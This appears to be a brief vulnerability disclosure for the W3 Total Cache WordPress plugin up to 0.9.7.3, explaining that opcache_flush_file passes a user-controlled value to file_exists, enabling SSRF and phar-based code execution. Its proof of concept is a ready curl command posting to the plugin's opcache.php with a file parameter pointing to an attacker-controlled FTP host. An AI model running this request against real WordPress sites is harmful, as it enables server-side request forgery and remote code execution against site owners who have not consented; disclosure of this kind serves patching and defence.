# Wordpress W3 Total Cache SSRF/RCE
W3 Total Cache &lt;= 0.9.7.3 - SSRF / RCE via phar

# Description:
The implementation of `opcache_flush_file` calls `file_exists` with a parameter fully controlled by the user.

# POC:

> curl 'http://x.x.x.x/wp-content/plugins/w3-total-cache/pub/opcache.php' --data 'nonce=974ca6ad15021a6668e7ae02e1be551c&command=flush_file&file=ftp://y.y.y.y:zzzz/' 
